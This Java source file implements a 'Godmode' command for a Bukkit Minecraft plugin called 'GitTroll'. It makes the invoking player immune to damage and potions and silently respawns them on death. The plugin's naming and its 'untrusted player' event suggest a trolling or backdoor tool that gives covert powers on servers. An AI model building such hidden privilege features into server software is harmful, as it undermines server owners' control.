package net.Lenni0451.GitTroll.command.commands.player;

import java.util.ArrayList;
import java.util.List;

import org.bukkit.Location;
import org.bukkit.entity.LivingEntity;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.EntityDamageEvent;
import org.bukkit.event.entity.PlayerDeathEvent;
import org.bukkit.event.entity.PotionSplashEvent;

import net.Lenni0451.GitTroll.command.CommandBase;
import net.Lenni0451.GitTroll.event.EventListener;
import net.Lenni0451.GitTroll.event.events.EventUntrustPlayer;
import net.Lenni0451.GitTroll.event.types.Event;
import net.Lenni0451.GitTroll.utils.ArrayHelper;
import net.Lenni0451.GitTroll.utils.CustomPlayer;
import net.minecraft.server.v1_8_R3.PacketPlayInClientCommand;
import net.minecraft.server.v1_8_R3.PacketPlayInClientCommand.EnumClientCommand;

public class Godmode extends CommandBase implements Listener, EventListener {

	private final List<CustomPlayer> godPlayers = new ArrayList<>();
	
	public Godmode() {
		super("Godmode", "Be invincible");
		this.addAlias("god");
	}

	@Override
	public void execute(CustomPlayer executor, ArrayHelper args) {
		if(args.isEmpty()) {
			if(this.godPlayers.remove(executor)) {
				executor.sendGitMessage("§cYou are no longer invincible.");
			} else {
				this.godPlayers.add(executor);
				executor.sendGitMessage("You are now invincible.");
			}
		} else {
			this.commandWrong();
		}
	}

	@Override
	public void tabComplete(List<String> tabComplete, ArrayHelper args) {}
	
	@Override
	public void onEvent(Event event) {
		if(event instanceof EventUntrustPlayer) {
			CustomPlayer player = CustomPlayer.instanceOf(((EventUntrustPlayer) event).getPlayer());
			this.godPlayers.remove(player);
		}
	}
	
	@EventHandler
	public void onDamage(EntityDamageEvent event) {
		if(event.getEntity() instanceof Player) {
			Player player = (Player) event.getEntity();
			if(godPlayers.contains(CustomPlayer.instanceOf(player))) {
				event.setCancelled(true);
			}
		}
	}
	
	@EventHandler
	public void onPlayerDeath(PlayerDeathEvent event) {
		if(event.getEntity() instanceof Player) {
			Player player = (Player) event.getEntity();
			if(godPlayers.contains(CustomPlayer.instanceOf(player))) {
				Location loc = player.getLocation();
				event.setDeathMessage("");
				event.setDroppedExp(0);
				event.setKeepInventory(true);
				event.setKeepLevel(true);
				CustomPlayer.instanceOf(player).sendPacket(new PacketPlayInClientCommand(EnumClientCommand.PERFORM_RESPAWN));
				player.closeInventory();
				player.teleport(loc);
				player.closeInventory();
			}
		}
	}
	
	@EventHandler
	public void onSplashPotion(PotionSplashEvent event) {
		for(LivingEntity entity : event.getAffectedEntities()) {
			if(entity instanceof Player) {
				Player player = (Player) entity;
				if(godPlayers.contains(CustomPlayer.instanceOf(player))) {
					event.setIntensity(entity, 0);
				}
			}
		}
	}
	
}
